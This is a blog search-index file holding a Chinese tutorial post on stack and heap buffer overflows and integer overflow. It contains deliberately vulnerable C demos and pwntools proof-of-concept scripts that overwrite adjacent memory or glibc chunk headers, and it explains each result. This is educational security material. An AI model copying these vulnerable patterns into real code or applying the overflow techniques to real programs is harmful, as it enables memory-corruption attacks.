<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>溢出类漏洞</title>
    <link href="/2025/01/16/overflow/"/>
    <url>/2025/01/16/overflow/</url>
    
    <content type="html"><![CDATA[<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>当程序向缓冲区（例如数组、堆栈等）中写入的数据量超过了该缓冲区的边界限制时，就会发生缓冲区溢出。这会导致超出部分的数据覆盖相邻的内存空间，可能导致程序崩溃、行为异常或者被利用来进行安全攻击，如执行恶意代码。这是越界写入的一种具体情形。</p><h2 id="栈上的缓冲区溢出"><a href="#栈上的缓冲区溢出" class="headerlink" title="栈上的缓冲区溢出"></a>栈上的缓冲区溢出</h2><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> target = <span class="hljs-number">0UL</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buffer = <span class="hljs-number">0UL</span>;<br><br>    read(<span class="hljs-number">0</span>, &amp;buffer, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">if</span> (target == <span class="hljs-number">0xdeadbeef</span>UL) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;A stack buffer overflow occurred!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io: process = process(<span class="hljs-string">&#x27;./a.out&#x27;</span>)<br>io.send(cyclic(<span class="hljs-number">0x8</span>)+ p64(<span class="hljs-number">0xdeadbeef</span>))<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">A stack buffer overflow occurred!<br></code></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>&emsp;&emsp;这里使用<code>read</code>从标准输入向<code>buffer</code>中读入16字节数据，而<code>buffer</code>的大小只有8字节(<code>sizeof(unsigned long)</code>)。<strong>当我们向<code>buffer</code>写入超过8字节数据时，由于<code>read</code>从低地址向高地址写入数据，超出缓冲区的数据会被写入到更高地址变量<code>target</code>中。</strong>也就是说，我们可以修改<code>target</code>的内容。</p><p>&emsp;&emsp;这提醒我们，变量只是在C语言中编译期的概念，而在运行时已经没有了变量的概念，只有内存地址和值的概念，因此对变量大小的约束在运行时失去了作用。</p><h2 id="堆上的缓冲区溢出"><a href="#堆上的缓冲区溢出" class="headerlink" title="堆上的缓冲区溢出"></a>堆上的缓冲区溢出</h2><p>通过<code>malloc</code>等动态分配内存函数分配的内存位于堆上。在堆上的缓冲区溢出与栈上不同，对于<code>glibc</code>，每个分配的堆内存前方有一个chunk结构，也就是说，如果想要直接修改下一个堆块内存数据需要更大的溢出。但在堆攻击中，我们关注的是chunk头而非数据本身。</p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> *buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *target = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x8</span>);<br>    <br>    read(<span class="hljs-number">0</span>, buffer, <span class="hljs-number">0x28</span>);<br>    <span class="hljs-keyword">if</span> (*target == <span class="hljs-number">0xdeadbeef</span>UL) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;A heap buffer overflow occurred!&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(target);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io: process = process(<span class="hljs-string">&#x27;./a.out&#x27;</span>)<br>io.send(cyclic(<span class="hljs-number">0x10</span>) + cyclic(<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0xdeadbeef</span>))<br>io.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">A heap buffer <span class="hljs-attribute">overflow</span> occurred!<br><span class="hljs-function"><span class="hljs-title">munmap_chunk</span><span class="hljs-params">()</span></span>: invalid pointer<br></code></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>&emsp;&emsp;这里使用<code>read(0, buffer, 0x28)</code>从标准输入向<code>buffer</code>读入0x28大小数据，超过了<code>buffer</code>的大小(0x10)。但与栈溢出不同的是，为了覆盖<code>target</code>的值，我们在中间多写入0x10个数据，来覆盖chunk头。也就是说，在堆上分配的内存并非是直接连续相连的，每个<code>malloc</code>返回的内存前方都会有一个chunk头（大小为0x10），当chunk头被破坏时，<code>free</code>将无法发挥作用。因此当我们free掉这个被破坏chunk头的堆块时，<code>glibc</code>报错，程序终止运行。</p><h1 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h1><h2 id="隐式转换溢出"><a href="#隐式转换溢出" class="headerlink" title="隐式转换溢出"></a>隐式转换溢出</h2><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%u\n&quot;</span>, <span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在我的64位Ubuntu上，结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs p">4294967295<br></code></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>这里以打印无符号数的方式打印了<code>-1</code>，这个过程中发生了隐式转换<code>(unsigned int)(-1)</code>。在计算机中，**一般有符号整数使用其补码表示，其二进制形式为32个1，而将其看作一个无符号数时，也就是4294967295(2<sup>32</sup>-1)**，这是一个非常大的整数。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
